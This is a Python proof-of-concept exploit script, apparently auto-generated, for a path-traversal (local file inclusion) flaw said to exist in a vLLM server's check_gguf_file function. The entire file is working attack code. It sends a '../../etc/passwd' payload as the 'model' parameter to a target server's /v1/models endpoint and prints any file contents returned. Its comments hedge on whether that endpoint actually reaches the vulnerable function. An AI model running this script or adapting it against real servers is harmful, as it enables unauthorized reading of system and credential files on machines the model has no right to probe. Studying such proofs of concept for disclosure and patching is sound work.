#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: lfi-001
# Sink: check_gguf_file
# Auto-generated — run with: python3 lfi_api_request_check_gguf_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in vllm-project-vllm-7193774.

Vulnerability: The check_gguf_file function opens a user-controlled file path
without sanitization, allowing path traversal to read arbitrary files.

This PoC demonstrates reading /etc/passwd via the 'model' parameter.
"""

import argparse
import sys
import requests
import json
from pathlib import Path

def exploit_lfi(target_url: str, file_to_read: str = "/etc/passwd") -> None:
    """
    Attempt to read an arbitrary file via the LFI vulnerability.
    
    Args:
        target_url: Base URL of the vLLM server (e.g., http://localhost:8000)
        file_to_read: Path to the file to read (default: /etc/passwd)
    """
    # Construct the payload with path traversal
    # The model parameter is passed to get_config -> check_gguf_file
    # We use '../../etc/passwd' to traverse out of the models directory
    payload = f"../../{file_to_read.lstrip('/')}"
    
    # The API endpoint that triggers the vulnerability
    # This is typically the model loading endpoint
    endpoint = f"{target_url.rstrip('/')}/v1/models"
    
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")
    print(f"[*] Payload: {payload}")
    
    try:
        # Send request with malicious model parameter
        # The model parameter is passed through the request body or query params
        response = requests.get(
            endpoint,
            params={"model": payload},
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        
        # Check if we got a successful response
        if response.status_code == 200:
            print("[+] Success! File content may be in response:")
            print(response.text[:2000])  # Print first 2000 chars
            
            # Try to parse as JSON if possible
            try:
                data = response.json()
                print(f"[*] JSON response: {json.dumps(data, indent=2)[:2000]}")
            except:
                pass
        else:
            print(f"[-] Request failed with status {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("[-] Make sure the vLLM server is running and accessible")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out after 10 seconds")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI vulnerability in vllm-project-vllm-7193774"
    )
    parser.add_argument(
        "-t", "--target",
        default="http://localhost:8000",
        help="Target vLLM server URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "-f", "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("vLLM LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[-] Target URL must start with http:// or https://")
        sys.exit(1)
    
    # Run the exploit
    exploit_lfi(args.target, args.file)
    
    print()
    print("[*] Exploit completed")

if __name__ == "__main__":
    main()
